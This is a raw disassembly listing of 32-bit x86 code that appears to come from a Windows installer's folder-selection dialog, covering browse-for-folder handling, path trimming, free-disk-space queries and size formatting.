  4049df:	85 c0                	test   %eax,%eax
  4049e1:	0f 84 8c 02 00 00    	je     0x404c73
  4049e7:	6a 01                	push   $0x1
  4049e9:	57                   	push   %edi
  4049ea:	ff d0                	call   *%eax
  4049ec:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4049f3:	0f 85 d1 00 00 00    	jne    0x404aca
  4049f9:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4049fd:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404a02:	75 18                	jne    0x404a1c
  404a04:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404a07:	c1 e9 10             	shr    $0x10,%ecx
  404a0a:	66 81 f9 00 03       	cmp    $0x300,%cx
  404a0f:	0f 85 5e 02 00 00    	jne    0x404c73
  404a15:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404a1c:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404a21:	0f 85 a3 00 00 00    	jne    0x404aca
  404a27:	6a 07                	push   $0x7
  404a29:	33 c0                	xor    %eax,%eax
  404a2b:	59                   	pop    %ecx
  404a2c:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404a2f:	ff 75 f8             	push   -0x8(%ebp)
  404a32:	f3 ab                	rep stos %eax,%es:(%edi)
  404a34:	bf 58 09 42 00       	mov    $0x420958,%edi
  404a39:	68 30 fd 41 00       	push   $0x41fd30
  404a3e:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404a41:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404a44:	c7 45 c8 88 4c 40 00 	movl   $0x404c88,-0x38(%ebp)
  404a4b:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404a4e:	e8 45 1a 00 00       	call   0x406498
  404a53:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404a56:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404a59:	50                   	push   %eax
  404a5a:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404a61:	ff 15 6c 81 40 00    	call   *0x40816c
  404a67:	85 c0                	test   %eax,%eax
  404a69:	74 58                	je     0x404ac3
  404a6b:	50                   	push   %eax
  404a6c:	ff 15 8c 82 40 00    	call   *0x40828c
  404a72:	53                   	push   %ebx
  404a73:	e8 1f 13 00 00       	call   0x405d97
  404a78:	a1 70 43 42 00       	mov    0x424370,%eax
  404a7d:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404a83:	85 c0                	test   %eax,%eax
  404a85:	74 28                	je     0x404aaf
  404a87:	81 fb 00 a4 42 00    	cmp    $0x42a400,%ebx
  404a8d:	75 20                	jne    0x404aaf
  404a8f:	50                   	push   %eax
  404a90:	6a 00                	push   $0x0
  404a92:	e8 01 1a 00 00       	call   0x406498
  404a97:	57                   	push   %edi
  404a98:	bf 00 33 42 00       	mov    $0x423300,%edi
  404a9d:	57                   	push   %edi
  404a9e:	ff 15 fc 80 40 00    	call   *0x4080fc
  404aa4:	85 c0                	test   %eax,%eax
  404aa6:	74 07                	je     0x404aaf
  404aa8:	57                   	push   %edi
  404aa9:	53                   	push   %ebx
  404aaa:	e8 72 19 00 00       	call   0x406421
  404aaf:	ff 05 48 09 42 00    	incl   0x420948
  404ab5:	53                   	push   %ebx
  404ab6:	68 fb 03 00 00       	push   $0x3fb
  404abb:	56                   	push   %esi
  404abc:	e8 38 10 00 00       	call   0x405af9
  404ac1:	eb 07                	jmp    0x404aca
  404ac3:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404aca:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404ad1:	74 0d                	je     0x404ae0
  404ad3:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404ada:	0f 85 93 01 00 00    	jne    0x404c73
  404ae0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404ae4:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404ae8:	53                   	push   %ebx
  404ae9:	68 fb 03 00 00       	push   $0x3fb
  404aee:	e8 0c 10 00 00       	call   0x405aff
  404af3:	53                   	push   %ebx
  404af4:	e8 8c 13 00 00       	call   0x405e85
  404af9:	85 c0                	test   %eax,%eax
  404afb:	75 07                	jne    0x404b04
  404afd:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404b04:	be 28 f9 41 00       	mov    $0x41f928,%esi
  404b09:	53                   	push   %ebx
  404b0a:	56                   	push   %esi
  404b0b:	e8 f5 18 00 00       	call   0x406405
  404b10:	6a 01                	push   $0x1
  404b12:	e8 16 1d 00 00       	call   0x40682d
  404b17:	85 c0                	test   %eax,%eax
  404b19:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404b1c:	74 35                	je     0x404b53
  404b1e:	33 c0                	xor    %eax,%eax
  404b20:	33 ff                	xor    %edi,%edi
  404b22:	3b c6                	cmp    %esi,%eax
  404b24:	74 2d                	je     0x404b53
  404b26:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404b29:	50                   	push   %eax
  404b2a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404b2d:	50                   	push   %eax
  404b2e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404b31:	50                   	push   %eax
  404b32:	56                   	push   %esi
  404b33:	ff 55 f4             	call   *-0xc(%ebp)
  404b36:	85 c0                	test   %eax,%eax
  404b38:	75 71                	jne    0x404bab
  404b3a:	85 ff                	test   %edi,%edi
  404b3c:	74 02                	je     0x404b40
  404b3e:	20 07                	and    %al,(%edi)
  404b40:	56                   	push   %esi
  404b41:	e8 98 12 00 00       	call   0x405dde
  404b46:	8b f8                	mov    %eax,%edi
  404b48:	80 27 00             	andb   $0x0,(%edi)
  404b4b:	4f                   	dec    %edi
  404b4c:	3b fe                	cmp    %esi,%edi
  404b4e:	c6 07 5c             	movb   $0x5c,(%edi)
  404b51:	75 d3                	jne    0x404b26
  404b53:	53                   	push   %ebx
  404b54:	56                   	push   %esi
  404b55:	e8 ab 18 00 00       	call   0x406405
  404b5a:	56                   	push   %esi
  404b5b:	e8 d0 12 00 00       	call   0x405e30
  404b60:	33 ff                	xor    %edi,%edi
  404b62:	3b c7                	cmp    %edi,%eax
  404b64:	74 03                	je     0x404b69
  404b66:	80 20 00             	andb   $0x0,(%eax)
  404b69:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404b6c:	50                   	push   %eax
  404b6d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b70:	50                   	push   %eax
  404b71:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404b74:	50                   	push   %eax
  404b75:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b78:	50                   	push   %eax
  404b79:	56                   	push   %esi
  404b7a:	ff 15 88 80 40 00    	call   *0x408088
  404b80:	85 c0                	test   %eax,%eax
  404b82:	74 43                	je     0x404bc7
  404b84:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b87:	be 00 04 00 00       	mov    $0x400,%esi
  404b8c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404b90:	56                   	push   %esi
  404b91:	ff 75 f4             	push   -0xc(%ebp)
  404b94:	50                   	push   %eax
  404b95:	ff 15 3c 81 40 00    	call   *0x40813c
  404b9b:	99                   	cltd
  404b9c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404b9f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404ba2:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404ba9:	eb 21                	jmp    0x404bcc
  404bab:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404bae:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404bb1:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404bb5:	c1 e9 0a             	shr    $0xa,%ecx
  404bb8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404bbb:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404bbe:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404bc5:	33 ff                	xor    %edi,%edi
  404bc7:	be 00 04 00 00       	mov    $0x400,%esi
  404bcc:	6a 05                	push   $0x5
  404bce:	e8 f8 01 00 00       	call   0x404dcb
  404bd3:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404bd6:	74 19                	je     0x404bf1
  404bd8:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404bdb:	33 c9                	xor    %ecx,%ecx
  404bdd:	3b d1                	cmp    %ecx,%edx
  404bdf:	77 10                	ja     0x404bf1
  404be1:	72 07                	jb     0x404bea
  404be3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404be6:	3b c8                	cmp    %eax,%ecx
  404be8:	73 07                	jae    0x404bf1
  404bea:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404bf1:	8b 0d 3c 3b 42 00    	mov    0x423b3c,%ecx
  404bf7:	39 79 10             	cmp    %edi,0x10(%ecx)
  404bfa:	74 30                	je     0x404c2c
  404bfc:	50                   	push   %eax
  404bfd:	6a fb                	push   $0xfffffffb
  404bff:	68 ff 03 00 00       	push   $0x3ff
  404c04:	e8 aa 01 00 00       	call   0x404db3
  404c09:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c0c:	74 10                	je     0x404c1e
  404c0e:	ff 75 d8             	push   -0x28(%ebp)
  404c11:	ff 75 d4             	push   -0x2c(%ebp)
  404c14:	6a fc                	push   $0xfffffffc
  404c16:	56                   	push   %esi
  404c17:	e8 d2 00 00 00       	call   0x404cee
  404c1c:	eb 0e                	jmp    0x404c2c
  404c1e:	68 14 f9 41 00       	push   $0x41f914
  404c23:	56                   	push   %esi
  404c24:	ff 75 08             	push   0x8(%ebp)
  404c27:	e8 cd 0e 00 00       	call   0x405af9
  404c2c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c2f:	3b c7                	cmp    %edi,%eax
  404c31:	a3 04 44 42 00       	mov    %eax,0x424404
  404c36:	75 0a                	jne    0x404c42
  404c38:	6a 07                	push   $0x7
  404c3a:	e8 cc c7 ff ff       	call   0x40140b
  404c3f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c42:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404c45:	85 70 14             	test   %esi,0x14(%eax)
  404c48:	74 03                	je     0x404c4d
  404c4a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404c4d:	33 c0                	xor    %eax,%eax
  404c4f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404c52:	0f 94 c0             	sete   %al
  404c55:	50                   	push   %eax
  404c56:	e8 6c f8 ff ff       	call   0x4044c7
  404c5b:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404c5e:	75 0d                	jne    0x404c6d
  404c60:	39 3d 48 09 42 00    	cmp    %edi,0x420948
  404c66:	75 05                	jne    0x404c6d
  404c68:	e8 23 fc ff ff       	call   0x404890
  404c6d:	89 3d 48 09 42 00    	mov    %edi,0x420948
  404c73:	ff 75 14             	push   0x14(%ebp)
  404c76:	ff 75 10             	push   0x10(%ebp)
  404c79:	ff 75 0c             	push   0xc(%ebp)
  404c7c:	e8 8b f8 ff ff       	call   0x40450c
  404c81:	5f                   	pop    %edi
  404c82:	5e                   	pop    %esi
  404c83:	5b                   	pop    %ebx
  404c84:	c9                   	leave
  404c85:	c2 10 00             	ret    $0x10
  404c88:	55                   	push   %ebp
  404c89:	8b ec                	mov    %esp,%ebp
  404c8b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404c8f:	56                   	push   %esi
  404c90:	8b 35 44 82 40 00    	mov    0x408244,%esi
  404c96:	75 1c                	jne    0x404cb4
  404c98:	ff 75 14             	push   0x14(%ebp)
  404c9b:	68 fb 03 00 00       	push   $0x3fb
  404ca0:	e8 5a 0e 00 00       	call   0x405aff
  404ca5:	ff 75 14             	push   0x14(%ebp)
  404ca8:	6a 01                	push   $0x1
  404caa:	68 66 04 00 00       	push   $0x466
  404caf:	ff 75 08             	push   0x8(%ebp)
  404cb2:	ff d6                	call   *%esi
  404cb4:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404cb8:	75 2d                	jne    0x404ce7
  404cba:	ff 75 14             	push   0x14(%ebp)
  404cbd:	ff 75 10             	push   0x10(%ebp)
  404cc0:	ff 15 68 81 40 00    	call   *0x408168
  404cc6:	85 c0                	test   %eax,%eax
  404cc8:	74 0e                	je     0x404cd8
  404cca:	6a 07                	push   $0x7
  404ccc:	e8 3a c7 ff ff       	call   0x40140b
  404cd1:	85 c0                	test   %eax,%eax
  404cd3:	75 03                	jne    0x404cd8
  404cd5:	40                   	inc    %eax
  404cd6:	eb 02                	jmp    0x404cda
  404cd8:	33 c0                	xor    %eax,%eax
  404cda:	50                   	push   %eax
  404cdb:	6a 00                	push   $0x0
  404cdd:	68 65 04 00 00       	push   $0x465
  404ce2:	ff 75 08             	push   0x8(%ebp)
  404ce5:	ff d6                	call   *%esi
  404ce7:	33 c0                	xor    %eax,%eax
  404ce9:	5e                   	pop    %esi
  404cea:	5d                   	pop    %ebp
  404ceb:	c2 10 00             	ret    $0x10
  404cee:	55                   	push   %ebp
  404cef:	8b ec                	mov    %esp,%ebp
  404cf1:	83 ec 40             	sub    $0x40,%esp
  404cf4:	8b 45 14             	mov    0x14(%ebp),%eax
  404cf7:	53                   	push   %ebx
  404cf8:	56                   	push   %esi
  404cf9:	8b 75 10             	mov    0x10(%ebp),%esi
  404cfc:	57                   	push   %edi
  404cfd:	6a dc                	push   $0xffffffdc
  404cff:	85 c0                	test   %eax,%eax
  404d01:	5b                   	pop    %ebx
  404d02:	74 0b                	je     0x404d0f
  404d04:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404d08:	c1 e8 14             	shr    $0x14,%eax
  404d0b:	33 ff                	xor    %edi,%edi
  404d0d:	eb 4e                	jmp    0x404d5d
  404d0f:	6a 14                	push   $0x14
  404d11:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404d17:	59                   	pop    %ecx
  404d18:	8b c6                	mov    %esi,%eax
  404d1a:	73 06                	jae    0x404d22
  404d1c:	6a 0a                	push   $0xa
  404d1e:	59                   	pop    %ecx
  404d1f:	6a dd                	push   $0xffffffdd
  404d21:	5b                   	pop    %ebx
  404d22:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404d28:	73 05                	jae    0x404d2f
  404d2a:	6a de                	push   $0xffffffde
  404d2c:	33 c9                	xor    %ecx,%ecx
  404d2e:	5b                   	pop    %ebx
  404d2f:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404d35:	73 0d                	jae    0x404d44
  404d37:	33 c0                	xor    %eax,%eax
  404d39:	6a 14                	push   $0x14
  404d3b:	40                   	inc    %eax
  404d3c:	5f                   	pop    %edi
  404d3d:	d3 e0                	shl    %cl,%eax
  404d3f:	99                   	cltd
  404d40:	f7 ff                	idiv   %edi
  404d42:	03 c6                	add    %esi,%eax
  404d44:	8b f0                	mov    %eax,%esi
  404d46:	25 ff ff ff 00       	and    $0xffffff,%eax
  404d4b:	6a 0a                	push   $0xa
  404d4d:	33 d2                	xor    %edx,%edx
  404d4f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404d52:	03 c0                	add    %eax,%eax
  404d54:	d3 e8                	shr    %cl,%eax
  404d56:	d3 ee                	shr    %cl,%esi
  404d58:	59                   	pop    %ecx
  404d59:	f7 f1                	div    %ecx
  404d5b:	8b fa                	mov    %edx,%edi
  404d5d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404d60:	6a df                	push   $0xffffffdf
  404d62:	50                   	push   %eax
  404d63:	e8 30 17 00 00       	call   0x406498
  404d68:	50                   	push   %eax
  404d69:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404d6c:	53                   	push   %ebx
  404d6d:	50                   	push   %eax
  404d6e:	e8 25 17 00 00       	call   0x406498
  404d73:	50                   	push   %eax
  404d74:	57                   	push   %edi
  404d75:	56                   	push   %esi
  404d76:	68 18 a2 40 00       	push   $0x40a218
  404d7b:	ff 75 0c             	push   0xc(%ebp)
  404d7e:	be 58 09 42 00       	mov    $0x420958,%esi
  404d83:	56                   	push   %esi
  404d84:	e8 0f 17 00 00       	call   0x406498
  404d89:	56                   	push   %esi
  404d8a:	8b f8                	mov    %eax,%edi
  404d8c:	e8 8a 16 00 00       	call   0x40641b
  404d91:	03 f8                	add    %eax,%edi
  404d93:	57                   	push   %edi
  404d94:	ff 15 18 82 40 00    	call   *0x408218
  404d9a:	83 c4 18             	add    $0x18,%esp
  404d9d:	56                   	push   %esi
  404d9e:	ff 75 08             	push   0x8(%ebp)
  404da1:	ff 35 38 3b 42 00    	push   0x423b38
  404da7:	e8 4d 0d 00 00       	call   0x405af9
  404dac:	5f                   	pop    %edi
  404dad:	5e                   	pop    %esi
  404dae:	5b                   	pop    %ebx
  404daf:	c9                   	leave
  404db0:	c2 10 00             	ret    $0x10
  404db3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404db7:	33 c9                	xor    %ecx,%ecx
  404db9:	51                   	push   %ecx
  404dba:	50                   	push   %eax
  404dbb:	ff 74 24 10          	push   0x10(%esp)
  404dbf:	ff 74 24 10          	push   0x10(%esp)
  404dc3:	e8 26 ff ff ff       	call   0x404cee
  404dc8:	c2 0c 00             	ret    $0xc
  404dcb:	8b 15 8c 43 42 00    	mov    0x42438c,%edx
  404dd1:	8b 0d 88 43 42 00    	mov    0x424388,%ecx
  404dd7:	33 c0                	xor    %eax,%eax
  404dd9:	85 d2                	test   %edx,%edx
  404ddb:	74 18                	je     0x404df5
